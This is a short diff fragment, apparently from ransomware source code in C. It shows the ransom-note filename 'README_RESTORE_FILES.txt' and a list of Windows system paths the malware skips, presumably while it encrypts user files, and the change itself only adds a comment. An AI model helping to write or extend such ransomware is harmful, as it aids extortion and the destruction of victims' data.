@@ -15,6 +15,7 @@ static const char* ransom_filename = "README_RESTORE_FILES.txt";
 
 static const char *skipped_path_keywords[] = {
     "\\AppData\\Local",
+    // Following is useless for Users dir
     "\\Program Files",
     "\\Windows",
     "\\System32",
